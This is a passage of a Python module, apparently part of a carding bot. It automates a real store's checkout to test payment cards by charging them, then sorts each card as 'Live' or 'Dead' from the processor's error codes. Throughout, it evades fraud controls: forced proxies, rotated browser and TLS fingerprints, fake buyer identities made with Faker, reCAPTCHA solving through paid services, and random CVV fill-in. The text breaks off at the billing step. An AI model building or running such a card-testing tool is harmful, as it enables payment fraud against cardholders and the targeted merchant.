"""Gate Medusa PayFlow Pro CCN Charged ($11.39 USD ~ $215 MXN) — Vedanta ShopSite.

Tienda: www.vedanta.com/store (ShopSite Pro 15.0 sp1 r3).
SIN tokenizacion JS: la tarjeta se POSTea en claro y el cargo lo hace el
backend contra PayPal del lado del servidor (firma Payflow: error 15004 +
PNREF de 12 chars). Ver bloque Vedanta de la skill atenea-gateway.

FLUJO MEDIDO (HAR evidencias/vendata/vedanta.har, 2026-11-02)
------------------------------------------------------------
    1. GET  /store/wishing_tree.htm            producto 1994 ($1.00)
    2. POST /cgi-vedanta/sb/order.cgi          function=add&itemnum=1994
    3. GET  order.cgi?rd=1&sbid=...            carrito (sbid fresco)
    4. POST order.cgi  function=zip_code_changed (zip 95117)
    5. POST order.cgi  function=Checkout        (shipping usps06)
    6. POST order.cgi  function=Checkout        (orderinst=Send -> billing)
    7. GET  /cgi-vedanta/sb/billing.cgi        form de pago + reCAPTCHA v2
    8. resolver reCAPTCHA v2 (CapSolver -> AntiCaptcha -> 2Captcha)
    9. POST /cgi-vedanta/sb/thankyou.cgi       billing + tarjeta + captcha
   10. GET  billing.cgi?fromid=thankyou.cgi... VEREDICTO

REGLAS DURAS (medidas, no supuestas)
------------------------------------
*   PROXY FORZOSO: sin proxy disponible se aborta. Jamas salida directa.
    Una sesion = un proxy (todo el flujo por el mismo).
*   sbid/storeid/rnd1/rnd2/WO frescos por sesion: se parsean del HTML vivo,
    nunca hardcodeados (solo fallbacks si el parseo falla).
*   paytype: 0=Visa, 1=MasterCard, 2=Discover. Sin Amex: marca no soportada
    por el comercio -> no es veredicto de tarjeta.
*   pay4_2 a 4 digitos. Primer POST en claro; el servidor devuelve
    old_pay1/old_cvv2 (ExplodeA) para reintentos.
*   El veredicto vive en el billing.cgi del paso 10, bloque
    "Payment Processing Error ... Detailed error message:".
*   TODOS los errores al usuario son un solo mensaje sanitizado:
    "Error. Gate reportado". El detalle real va al log del servidor.

INTERFAZ HADES
--------------
    async def medusa_gate_check(card_data, user_id=None) -> dict
    async def medusa_gate_check_multiple(cards_data, callback=None, user_id=None) -> list

El resultado trae: status ("✅ Live" / "❌ Dead" / "⚠️ Error") y message
(texto corto para el usuario). classification/code/elapsed solo para el log.
"""
from __future__ import annotations

import asyncio
import html as _html
import logging
import os
import random
import re
import time
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl

logger = logging.getLogger(__name__)

USER_ERROR_MSG = "Error. Gate reportado"


def _gate_error(detail: str) -> Dict[str, str]:
    """Un solo mensaje de error sanitizado; el detalle queda en el log."""
    logger.warning("Medusa error: %s", detail)
    return {
        "status": "⚠️ Error",
        "classification": "ERROR",
        "message": USER_ERROR_MSG,
        "code": "",
        "elapsed": 0.0,
    }


def _log_real(message: str) -> None:
    """Detalle real al log del servidor (nunca al usuario)."""
    logger.info("[MEDUSA REAL] %s", message)


# ─────────────────────────────────────────────────────────────
# CONFIGURACIÓN (todo por env, sin hardcodes de merchant)
# ─────────────────────────────────────────────────────────────
BASE = (os.getenv("MEDUSA_BASE") or "https://www.vedanta.com").rstrip("/")
PRODUCT_PATH = os.getenv("MEDUSA_ITEM_URL", "/store/wishing_tree.htm")
PRODUCT_URL = (
    PRODUCT_PATH if PRODUCT_PATH.startswith("http") else BASE + PRODUCT_PATH
)
ORDER_CGI = BASE + "/cgi-vedanta/sb/order.cgi"
BILLING_CGI = BASE + "/cgi-vedanta/sb/billing.cgi"
THANKYOU_CGI = BASE + "/cgi-vedanta/sb/thankyou.cgi"

ITEMNUM = (os.getenv("MEDUSA_ITEMNUM") or "1994").strip()
# Minimo de $5 USD en el carrito para avanzar: el producto 1994 cuesta
# $1.00, asi que se agregan 5 unidades (add y checkout con la misma
# cantidad). Medido 2026-11-02: con qnty=1 el servidor responde 200 y se
# queda en el carrito; con qnty=5 responde 302 a billing.cgi.
ADD_QTY = (os.getenv("MEDUSA_QTY") or "5").strip()
CHECKOUT_QTY = (os.getenv("MEDUSA_CHECKOUT_QTY") or ADD_QTY).strip()
ZIP_CODE = (os.getenv("MEDUSA_ZIP") or "95117").strip()
SHIPPING = (os.getenv("MEDUSA_SHIPPING") or "usps06").strip()
MEDUSA_IMPERSONATE = (os.getenv("MEDUSA_IMPERSONATE") or "chrome150").strip()
MEDUSA_TIMEOUT = float(os.getenv("MEDUSA_TIMEOUT") or 30)
MEDUSA_CONCURRENCY = int(os.getenv("MEDUSA_CONCURRENCY") or 2)

# Precio del producto medido (cargo real por check: 5 x $1.00).
MEDUSA_CHARGE_LABEL = os.getenv("MEDUSA_CHARGE_LABEL", "$11.39 USD")

# Fallbacks si el parseo del HTML vivo falla (medidos 2026-11-02).
STOREID_FALLBACK = "*121ceca48a820a7c9750f4"
RECAPTCHA_SITEKEY_FALLBACK = "6LfdDBATAAAAANZlQxJZN8-2gQ4fcL4q-I3TGww9"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
)

# Pool de UAs reales con su impersonate + client-hints coherentes.
# Se rota uno por tarjeta: misma identidad durante todo el flujo.
_UA_POOL: List[Dict[str, str]] = [
    {
        # Medido en el HAR real (2026-11-02): el comprador usaba Android.
        "ua": (
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
        ),
        "impersonate": "chrome_android",
        "ch_ua": '"Chromium";v="148", "Quetta";v="148", "Not/A)Brand";v="99"',
        "mobile": "?1",
        "platform": '"Android"',
        "lang": "es-US,es;q=0.7",
    },
    {
        "ua": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
        ),
        "impersonate": "chrome150",
        "ch_ua": '"Chromium";v="150", "Not)A;Brand";v="24", "Google Chrome";v="150"',
        "mobile": "?0",
        "platform": '"Windows"',
        "lang": "en-US,en;q=0.9",
    },
    {
        "ua": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        ),
        "impersonate": "chrome131",
        "ch_ua": '"Chromium";v="131", "Not)A;Brand";v="24", "Google Chrome";v="131"',
        "mobile": "?0",
        "platform": '"Windows"',
        "lang": "en-US,en;q=0.9",
    },
    {
        "ua": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
        "impersonate": "chrome124",
        "ch_ua": '"Chromium";v="124", "Not)A;Brand";v="99", "Google Chrome";v="124"',
        "mobile": "?0",
        "platform": '"Windows"',
        "lang": "en-US,en;q=0.9",
    },
    {
        # edge101 verificado en vivo (edge122 revienta al pedir:
        # "Impersonating edge122 is not supported" con curl_cffi 0.16.3).
        "ua": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
        ),
        "impersonate": "edge101",
        "ch_ua": '"Chromium";v="122", "Not)A;Brand";v="24", "Microsoft Edge";v="122"',
        "mobile": "?0",
        "platform": '"Windows"',
        "lang": "en-US,en;q=0.9",
    },
    {
        "ua": (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
        ),
        "impersonate": "safari18_0",
        "ch_ua": "",
        "mobile": "?0",
        "platform": '"macOS"',
        "lang": "en-US,en;q=0.9",
    },
]


def _pick_ua() -> Dict[str, str]:
    """Un perfil UA real por tarjeta (impersonate + hints coherentes)."""
    return random.choice(_UA_POOL)


def _browser_headers(ua_entry: Dict[str, str]) -> Dict[str, str]:
    headers: Dict[str, str] = {
        "User-Agent": ua_entry["ua"],
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,*/*;q=0.8"
        ),
        "Accept-Language": ua_entry.get("lang", "en-US,en;q=0.9"),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }
    if ua_entry.get("ch_ua"):
        headers["sec-ch-ua"] = ua_entry["ch_ua"]
        headers["sec-ch-ua-mobile"] = ua_entry.get("mobile", "?0")
        headers["sec-ch-ua-platform"] = ua_entry.get("platform", '"Windows"')
    return headers


BROWSER_HEADERS: Dict[str, str] = _browser_headers(_UA_POOL[1])

TIMEOUT_SOLVER = 30
SOLVER_POLL_TRIES = 25
SOLVER_POLL_INTERVAL = 4

_GATE_SEM = asyncio.Semaphore(MEDUSA_CONCURRENCY)

_FAKE_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "duck.com"]

_CA_ZIPS = [
    "95117", "95125", "95128", "95126", "94086", "94040", "94301",
    "90210", "90001", "90012", "92101", "94102", "94110",
]


def _faker_identity() -> Dict[str, str]:
    """Identidad creible por tarjeta (Faker en_US): nombre, direccion, email.

    Zona horaria fija America/Mexico_City; los datos son de California
    (coherentes con el ZIP y State que manda el formulario).
    """
    from faker import Faker

    fake = Faker("en_US")
    first = fake.first_name()
    last = fake.last_name()
    full = f"{first} {last}"
    zip_code = ZIP_CODE or random.choice(_CA_ZIPS)
    return {
        "first": first,
        "last": last,
        "full": full,
        "street": fake.street_address(),
        "city": fake.city(),
        "state": "CA",
        "zip": zip_code,
        "country": "United States",
        "email": (
            f"{re.sub(r'[^a-z]', '', first.lower())}."
            f"{re.sub(r'[^a-z]', '', last.lower())}"
            f"{random.randint(10, 99)}@{random.choice(_FAKE_DOMAINS)}"
        ),
        "phone": f"+1 415 555 {random.randint(1000, 9999)}",
    }


# ─────────────────────────────────────────────────────────────
# PROXY FORZOSO (del .env via bot.services.proxies)
# ─────────────────────────────────────────────────────────────
def _pick_proxy() -> Optional[str]:
    """Proxy del gate. mx sticky primero, rotatorio de respaldo.

    Sin proxy NO hay gate: se aborta en vez de salir en directo.
    """
    try:
        from bot.services.proxies import gate_proxy as _gate_proxy

        proxy = _gate_proxy("mx") or _gate_proxy("rot")
        if proxy:
            return proxy
    except Exception as exc:
        _log_real(f"proxy mx/rot no disponible: {type(exc).__name__}: {exc}")
    return None


def _new_session(proxy_url: str, ua_entry: Optional[Dict[str, str]] = None) -> Any:
    """Sesion con huella de navegador. El proxy es obligatorio.

    El impersonate TLS va coherente con el User-Agent rotado (leccion 7.7
    de la skill: un desfase chrome131/UA Chrome-149 es huella evitable).
    Si el impersonate pedido revienta al pedir (p. ej. edge122 en
    curl_cffi 0.16.3), se cae a chrome150 en vez de tumbar el check.
    """
    from curl_cffi import requests as creq

    ua_entry = ua_entry or _pick_ua()
    impersonate = ua_entry.get("impersonate") or "chrome150"
    try:
        session = creq.Session(impersonate=impersonate)
        # Sonda inmediata: algunos targets crean la sesion pero revientan
        # al pedir (edge122). Mejor caer ahora que en mitad del flujo.
        session.get("https://www.vedanta.com/store/", timeout=10)
    except Exception as exc:
        _log_real(f"impersonate {impersonate} fallo ({exc}); caigo a chrome150")
        session = creq.Session(impersonate="chrome150")
    session.proxies = {"http": proxy_url, "https": proxy_url}
    session.headers.update(_browser_headers(ua_entry))
    return session


def _header(response: Any, name: str) -> str:
    """Lee una cabecera sin importar mayusculas (requests la guarda como
    vino; curl_cffi la normaliza a minusculas)."""
    try:
        headers = getattr(response, "headers", None) or {}
        if hasattr(headers, "get"):
            value = headers.get(name, "")
            if value:
                return str(value)
            value = headers.get(name.lower(), "")
            if value:
                return str(value)
            for key in list(headers.keys()):
                if str(key).lower() == name.lower():
                    return str(headers[key])
            return ""
        if isinstance(headers, dict):
            for key, value in headers.items():
                if str(key).lower() == name.lower():
                    return str(value or "")
    except Exception:
        pass
    return ""


def _post_form(
    session: Any, url: str, data: Dict[str, str], referer: str
) -> Any:
    """POST urlencoded con cabeceras de navegacion completas (Origin,
    Sec-Fetch-*, client-hints del UA rotado)."""
    headers = {
        "Origin": BASE,
        "Referer": referer,
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    return session.post(
        url, data=data, headers=headers, timeout=MEDUSA_TIMEOUT,
        allow_redirects=False,
    )


# ─────────────────────────────────────────────────────────────
# NORMALIZACIÓN DE TARJETA
# ─────────────────────────────────────────────────────────────
def _normalize_card(card_data: str) -> Optional[Tuple[str, str, str, str, str]]:
    """Acepta cc|mm|aa|cvv y cc|mm|aaaa|cvv.

    Devuelve (pan, mm2, aaaa, cvv, paytype) o None si no es válido.
    paytype ShopSite: 0=Visa, 1=MasterCard, 2=Discover.
    """
    try:
        original = (card_data or "").strip()
        parts = [p.strip() for p in re.split(r"\s*[|/:]\s*|\s+", original)]
        if len(parts) != 4:
            return None
        pan, mes, ano, cvv = parts
        if not pan.isdigit() or len(pan) not in (15, 16):
            return None
        if not mes.isdigit() or not (1 <= int(mes) <= 12):
            return None
        mm2 = mes.zfill(2)
        if not ano.isdigit():
            return None
        if len(ano) == 4:
            if not (2000 <= int(ano) <= 2099):
                return None
            aaaa = ano
        elif len(ano) == 2:
            aaaa = f"20{ano}"
        else:
            return None
        cvv_low = cvv.lower()
        if cvv_low in ("rnd", "xxx", "xxxx"):
            cvv = "".join(random.choices("0123456789", k=3))
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            return None
        paytype = {"4": "0", "5": "1", "6": "2"}.get(pan[0])
        if paytype is None:
            return None  # Amex y otras: el comercio no las acepta
        return pan, mm2, aaaa, cvv, paytype
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────
# PARSEO DE HTML VIVO
# ─────────────────────────────────────────────────────────────
def _hidden_inputs(html_text: str) -> Dict[str, str]:
    """Todos los <input type=hidden name value> (cualquier orden)."""
    out: Dict[str, str] = {}
    for tag in re.finditer(r"(?is)<input[^>]*>", html_text or ""):
        t = tag.group(0)
        if not re.search(r"(?i)type\s*=\s*[\"']?\s*hidden", t):
            continue
        name = re.search(r"(?i)name\s*=\s*[\"']([^\"']+)[\"']", t)
        if not name:
            continue
        value = re.search(r"(?i)value\s*=\s*\"([^\"]*)\"", t)
        if value is None:
            value = re.search(r"(?i)value\s*=\s*'([^']*)'", t)
        if value is None:
            value = re.search(r"(?i)value\s*=\s*([^\s>]+)", t)
        out[name.group(1)] = _html.unescape(value.group(1)) if value else ""
    return out


def _form_fields(html_text: str, form_name: str = "order") -> Dict[str, str]:
    """TODOS los campos del form indicado como los mandaria el navegador:
    inputs (hidden/text; checkbox/radio solo si checked, sin value -> "on"
    como hace el navegador), selects (option selected o primera) y
    textareas. Sin esto el POST queda incompleto (falta smb=on,
    j_script=10...) y el servidor no avanza.

    Se limita al form `name="order"`: la pagina trae otros forms
    (buscador) cuyos campos no van en el checkout.
    """
    scope = html_text or ""
    if form_name:
        found = None
        for candidate in re.finditer(r"(?is)<form.*?</form>", scope):
            if re.search(
                rf'(?i)name\s*=\s*["\']?{re.escape(form_name)}["\']?',
                candidate.group(0)[:500],
            ):
                found = candidate.group(0)
                break
        if found:
            scope = found
    out: Dict[str, str] = {}
    for tag in re.finditer(r"(?is)<input[^>]*>", scope):
        t = tag.group(0)
        name = re.search(r"(?i)name\s*=\s*[\"']([^\"']+)[\"']", t)
        if not name:
            continue
        n = name.group(1)
        typ = re.search(r"(?i)type\s*=\s*[\"']?([a-z]+)", t)
        ttype = (typ.group(1).lower() if typ else "text")
        if ttype in ("checkbox", "radio"):
            if not re.search(r"(?i)\bchecked\b", t):
                continue
        if ttype in ("submit", "image", "button", "file"):
            continue
        value = re.search(r"(?i)value\s*=\s*\"([^\"]*)\"", t)
        if value is None:
            value = re.search(r"(?i)value\s*=\s*'([^']*)'", t)
        if value is None:
            # Checkbox/radio sin value: el navegador manda "on".
            value = "on" if ttype in ("checkbox", "radio") else ""
            out[n] = value
            continue
        out[n] = _html.unescape(value.group(1))
    for sel in re.finditer(r"(?is)<select[^>]*>.*?</select>", html_text or ""):
        s = sel.group(0)
        name = re.search(r"(?i)name\s*=\s*[\"']([^\"']+)[\"']", s)
        if not name:
            continue
        opts = re.findall(r"(?is)<option([^>]*)>(.*?)</option>", s)
        chosen = ""
        for attrs, _text in opts:
            val = re.search(r"(?i)value\s*=\s*[\"']([^\"']*)[\"']", attrs)
            v = val.group(1) if val else ""
            if re.search(r"(?i)\bselected\b", attrs):
                chosen = v
                break
            if chosen == "" and v:
                pass
        if chosen == "" and opts:
            val = re.search(r"(?i)value\s*=\s*[\"']([^\"']*)[\"']", opts[0][0])
            chosen = val.group(1) if val else ""
        out[name.group(1)] = _html.unescape(chosen)
    for ta in re.finditer(r"(?is)<textarea[^>]*name\s*=\s*[\"']([^\"']+)[\"'][^>]*>(.*?)</textarea>", html_text or ""):
        out[ta.group(1)] = _html.unescape(ta.group(2).strip())
    return out


def _pick(pattern: str, html_text: str, default: str = "") -> str:
    m = re.search(pattern, html_text or "")
    return m.group(1) if m else default


def _captcha_sitekey(html_text: str) -> str:
    key = _pick(r'data-sitekey="([^"]+)"', html_text)
    return key or RECAPTCHA_SITEKEY_FALLBACK


# ─────────────────────────────────────────────────────────────
# SOLVERS reCAPTCHA v2 (CapSolver -> AntiCaptcha -> 2Captcha)
# ─────────────────────────────────────────────────────────────
def _poll_task_result(base_url: str, client_key: str, task_id: str) -> str:
    import requests as _rq

    for _ in range(SOLVER_POLL_TRIES):
        try:
            r = _rq.post(
                f"{base_url}/getTaskResult",
                json={"clientKey": client_key, "taskId": task_id},
                timeout=TIMEOUT_SOLVER,
            ).json()
        except Exception:
            time.sleep(SOLVER_POLL_INTERVAL)
            continue
        if r.get("status") == "ready":
            return r.get("solution", {}).get("gRecaptchaResponse", "") or ""
        if r.get("status") == "failed" or r.get("errorId") not in (None, 0, False):
            return ""
        time.sleep(SOLVER_POLL_INTERVAL)
    return ""


def _solve_capsolver_v2(client_key: str, page_url: str, sitekey: str) -> str:
    import requests as _rq

    try:
        r = _rq.post(
            "https://api.capsolver.com/createTask",
            json={
                "clientKey": client_key,
                "task": {
                    "type": "RecaptchaV2TaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": sitekey,
                },
            },
            timeout=TIMEOUT_SOLVER,
        ).json()
    except Exception as exc:
        _log_real(f"capsolver create error: {exc}")
        return ""
    if r.get("errorId") not in (None, 0, False) or not r.get("taskId"):
        _log_real(f"capsolver create failed: {str(r)[:200]}")
        return ""
    return _poll_task_result("https://api.capsolver.com", client_key, r["taskId"])


def _solve_anticaptcha_v2(client_key: str, page_url: str, sitekey: str) -> str:
    import requests as _rq

    try:
        r = _rq.post(
            "https://api.anti-captcha.com/createTask",
            json={
                "clientKey": client_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": sitekey,
                },
            },
            timeout=TIMEOUT_SOLVER,
        ).json()
    except Exception as exc:
        _log_real(f"anticaptcha create error: {exc}")
        return ""
    if r.get("errorId") not in (None, 0) or not r.get("taskId"):
        _log_real(f"anticaptcha create failed: {str(r)[:200]}")
        return ""
    task_id = r["taskId"]
    for _ in range(SOLVER_POLL_TRIES):
        try:
            res = _rq.post(
                "https://api.anti-captcha.com/getTaskResult",
                json={"clientKey": client_key, "taskId": task_id},
                timeout=TIMEOUT_SOLVER,
            ).json()
        except Exception:
            time.sleep(SOLVER_POLL_INTERVAL)
            continue
        if res.get("status") == "ready":
            return res.get("solution", {}).get("gRecaptchaResponse", "") or ""
        if res.get("status") == "failed" or res.get("errorId") not in (None, 0):
            return ""
        time.sleep(SOLVER_POLL_INTERVAL)
    return ""


def _solve_2captcha_v2(client_key: str, page_url: str, sitekey: str) -> str:
    import requests as _rq

    try:
        r = _rq.post(
            "https://api.2captcha.com/createTask",
            json={
                "clientKey": client_key,
                "task": {
                    "type": "RecaptchaV2TaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": sitekey,
                },
            },
            timeout=TIMEOUT_SOLVER,
        ).json()
    except Exception as exc:
        _log_real(f"2captcha create error: {exc}")
        return ""
    task_id = r.get("taskId")
    if r.get("errorId") not in (None, 0, False) or not task_id:
        _log_real(f"2captcha create failed: {str(r)[:200]}")
        return ""
    return _poll_task_result("https://api.2captcha.com", client_key, task_id)


def _captcha_token(page_url: str, sitekey: str) -> str:
    """Cadena CapSolver -> AntiCaptcha -> 2Captcha. '' si no hay solver."""
    token = ""
    capsolver_key = os.environ.get("CAPSOLVER_API_KEY", "")
    anticaptcha_key = os.environ.get("ANTICAPTCHA_API_KEY", "")
    twocaptcha_key = os.environ.get("TWO_CAPTCHA_API_KEY", "")
    if capsolver_key:
        token = _solve_capsolver_v2(capsolver_key, page_url, sitekey)
    if not token and anticaptcha_key:
        token = _solve_anticaptcha_v2(anticaptcha_key, page_url, sitekey)
    if not token and twocaptcha_key:
        token = _solve_2captcha_v2(twocaptcha_key, page_url, sitekey)
    if not token:
        _log_real("captcha sin solver con saldo o timeout")
    return token


# ─────────────────────────────────────────────────────────────
# CLASIFICACIÓN DEL VEREDICTO
# ─────────────────────────────────────────────────────────────
# El veredicto se decide SOLO por el `detail` (el "Detailed error
# message:" del bloque "Payment Processing Error"). Usar todo el HTML
# como blob genera falsos Live: la pagina siempre contiene "cvv" (campo
# cvv2 del form + texto "Card Verification Value") y "Total $11.39",
# asi que un `12: Declined: 15005` se marcaba LIVE CCN por la subcadena
# "cvv". Medido 2026-11-02: 15005 = declinada del procesador -> DEAD.
_LIVE_CCN_WORDS = (
    "cvv2 mismatch", "cvv mismatch", "15004", "incorrect_cvc", "invalid_cvc",
    "security code", "verification number",
)
_LIVE_AUTH_WORDS = (
    "insufficient funds", "insufficient fund", "insufficient_funds",
)
_DEAD_WORDS = (
    "15005", "declined", "do not honor", "do_not_honor", "invalid card",
    "invalid account", "expired", "incorrect_number", "invalid number",
    "call issuer", "pickup", "lost card", "stolen", "restricted",
    "not accepted", "transaction cannot", "cannot be processed",
    "do not honour",
)
_SUCCESS_MARKERS = (
    "thank you for your order", "order number", "order confirmation",
    "receipt", "your order has been", "order received",
)


def _clean_html_text(raw: str) -> str:
    text = re.sub(r"(?is)<script.*?</script>", " ", raw or "")
    text = re.sub(r"(?is)<style.*?</style>", " ", text)
    text = re.sub(r"(?is)<[^>]+>", " ", text)
    text = _html.unescape(text)
    return re.sub(r"\s+", " ", text).strip()


def _classify_verdict(html_text: str) -> Dict[str, str]:
    """Traduce el billing.cgi final a Live/Dead. Sin bloque de error claro
    y sin recibo -> Error sanitizado (no se inventa veredicto)."""
    text = _clean_html_text(html_text)
    low = text.lower()
    has_error_block = "payment processing error" in low

    detail = ""
    m = re.search(r"(?i)detailed error message:\s*(.{0,300})", text)
    if m:
        detail = m.group(1).strip()
    dlow = detail.lower()

    _log_real(f"veredicto crudo: error_block={has_error_block} detail={detail[:200]}")

    # Solo el detail decide: el resto del HTML trae el form (cvv2,
    # "Card Verification Value") y el total, que contaminan el match.
    if any(w in dlow for w in _LIVE_CCN_WORDS):
        return {
            "status": "✅ Live",
            "classification": "LIVE CCN",
            "message": f"CVV invalido — tarjeta valida | Charged {MEDUSA_CHARGE_LABEL}",
            "code": detail[:80],
        }
    if any(w in dlow for w in _LIVE_AUTH_WORDS):
        return {
            "status": "✅ Live",
            "classification": "LIVE AUTH",
            "message": f"Fondos insuficientes — tarjeta valida | Charged {MEDUSA_CHARGE_LABEL}",
            "code": detail[:80],
        }
    if has_error_block and any(w in dlow for w in _DEAD_WORDS):
        return {
            "status": "❌ Dead",
            "classification": "DEAD AUTH",
            "message": "Tarjeta declinada por el procesador",
            "code": detail[:80],
        }
    if has_error_block:
        # Hay bloque de error pero codigo desconocido: se reporta Dead con
        # el mensaje generico de declinada (el procesador respondio).
        return {
            "status": "❌ Dead",
            "classification": "DEAD AUTH",
            "message": "Tarjeta declinada por el procesador",
            "code": detail[:80],
        }
    if any(w in low for w in _SUCCESS_MARKERS):
        return {
            "status": "✅ Live",
            "classification": "APROBADA",
            "message": f"Aprobada — pago exitoso | Charged {MEDUSA_CHARGE_LABEL}",
            "code": "",
        }
    _log_real(f"sin veredicto claro, len={len(text)}")
    return {
        "status": "⚠️ Error",
        "classification": "ERROR",
        "message": USER_ERROR_MSG,
        "code": "",
    }


# ─────────────────────────────────────────────────────────────
# FLUJO COMPLETO (bloqueante: se corre en executor)
# ─────────────────────────────────────────────────────────────
def _flow(card: Tuple[str, str, str, str, str], proxy_url: str) -> Dict[str, str]:
    pan, mm, aaaa, cvv, paytype = card
    started = time.perf_counter()
    ident = _faker_identity()
    ua_entry = _pick_ua()

    def elapsed() -> float:
        return round(time.perf_counter() - started, 2)

    session = _new_session(proxy_url, ua_entry)
    nav_referer = BASE + "/store/OnSale.php"
    try:
        # 1. Producto -> hidden del form add (el itemnum va en un input,
        # no en el tag <form>: buscar el form que lo contenga).
        r = session.get(
            PRODUCT_URL,
            headers={"Referer": nav_referer, "Sec-Fetch-Site": "same-origin"},
            timeout=MEDUSA_TIMEOUT,
        )
        if r.status_code != 200:
            return _gate_error(f"producto HTTP {r.status_code}")
        nav_referer = PRODUCT_URL
        form = None
        for candidate in re.finditer(r"(?is)<form.*?</form>", r.text):
            if re.search(
                rf'name="itemnum" value="{re.escape(ITEMNUM)}"',
                candidate.group(0),
            ):
                form = candidate
                break
        if not form:
            forms = re.findall(r'(?is)<form[^>]*action="([^"]*order\.cgi[^"]*)"', r.text)
            if not forms:
                return _gate_error("sin form add en producto")
            storeid = _pick(r'name="storeid" value="([^"]+)"', r.text, STOREID_FALLBACK)
            add_data = {
                "storeid": storeid,
                "dbname": "products",
                "function": "add",
                "itemnum": ITEMNUM,
                f"{ITEMNUM}:qnty": ADD_QTY,
            }
        else:
            hiddens = _hidden_inputs(form.group(0))
            storeid = hiddens.get("storeid", STOREID_FALLBACK)
            add_data = dict(hiddens)
            add_data.setdefault("storeid", storeid)
            add_data.setdefault("dbname", "products")
            add_data.setdefault("function", "add")
            add_data.setdefault("itemnum", ITEMNUM)
            add_data[f"{ITEMNUM}:qnty"] = ADD_QTY

        # 2. add -> 302 -> carrito (sbid fresco en el Location).
        r = _post_form(session, ORDER_CGI, add_data, nav_referer)
        if r.status_code != 302:
            return _gate_error(f"add HTTP {r.status_code} (sin 302)")
        loc_add = _header(r, "Location")
        if not loc_add:
            return _gate_error("add sin redirect a carrito")
        r = session.get(
            loc_add, headers={"Referer": nav_referer}, timeout=MEDUSA_TIMEOUT,
            allow_redirects=False,
        )
        if r.status_code != 302:
            return _gate_error(f"carrito redirect HTTP {r.status_code}")
        loc_cart = _header(r, "Location")
        cart = session.get(
            loc_cart, headers={"Referer": loc_add}, timeout=MEDUSA_TIMEOUT,
        )
        if cart.status_code != 200:
            return _gate_error(f"carrito HTTP {cart.status_code}")
        nav_referer = ORDER_CGI
        cart_html = cart.text or ""
        state = _hidden_inputs(cart_html)
        sbid = state.get("sbid", "")
        if not sbid:
            sbid = _pick(r"[?&]sbid=([^&\"'<>]+)", loc_cart)
        if not sbid:
            _log_real("sin sbid en carrito")
            return _gate_error("sin sbid en carrito")
        _log_real(f"carrito OK sbid=...{sbid[-6:]}")

        page_html = [cart_html]

        def checkout_post(extra: Dict[str, str]) -> str:
            """Un paso del checkout: eco COMPLETO del form vivo (todos los
            campos: smb=on, j_script, cupones...) mas los overrides del
            paso. Los rnd1/rnd2 son anti-CSRF del servidor: se devuelven
            los del form, nunca inventados. Los hidden frescos vuelven
            al estado."""
            data = _form_fields(page_html[0])
            data.update(state)
            data.update(extra)
            rr = _post_form(session, ORDER_CGI, data, nav_referer)
            if rr.status_code not in (200, 302):
                return ""
            body = rr.text or ""
            if body:
                page_html[0] = body
                fresh = _hidden_inputs(body)
                if fresh.get("sbid"):
                    state.update(fresh)
            loc = _header(rr, "Location")
            if rr.status_code == 302 and loc and "billing.cgi" in loc:
                rb = session.get(
                    loc, headers={"Referer": nav_referer},
                    timeout=MEDUSA_TIMEOUT,
                )
                if rb.status_code == 200 and (rb.text or ""):
                    fresh = _hidden_inputs(rb.text or "")
                    if fresh.get("sbid") or "pay1" in (rb.text or ""):
                        state.update(fresh)
                    page_html[0] = rb.text or ""
                    return rb.text or ""
            return body

        # 3. Checkout directo con la cantidad que el servidor acepta.
        # Medido: zip change + 2x Checkout con qnty=1 -> 200 en carrito;
        # 1x Checkout con qnty=5 -> 302 a billing.cgi (HAR + sonda en vivo).
        page = checkout_post({
            "0:qnty": CHECKOUT_QTY,
            "country": "US",
            "j_script": "10",
            "zip_code": ident["zip"],
            "shipping": SHIPPING,
            "orderinst": "Send",
            "function": "Checkout",
        })
        if not page:
            return _gate_error("checkout sin respuesta")

        # 4. Billing: el paso 3 ya puede traerlo (302 a billing.cgi).
        billing_url = BILLING_CGI
        billing_html = page if "pay1" in (page or "") else ""
        if not billing_html:
            rb = session.get(
                BILLING_CGI,
                params={
                    "storeid": storeid,
                    "fromid": "order.cgi",
                    "redirect": "yes",
                    "shopinfo": sbid,
                },
                headers={"Referer": nav_referer},
                timeout=MEDUSA_TIMEOUT,
            )
            if rb.status_code != 200:
                return _gate_error(f"billing HTTP {rb.status_code}")
            billing_html = rb.text or ""
            billing_url = str(getattr(rb, "url", BILLING_CGI))
        if "pay1" not in billing_html:
            _log_real(f"billing sin form de pago len={len(billing_html)}")
            return _gate_error("billing sin form de pago")
        bill = _hidden_inputs(billing_html)
        sitekey = _captcha_sitekey(billing_html)
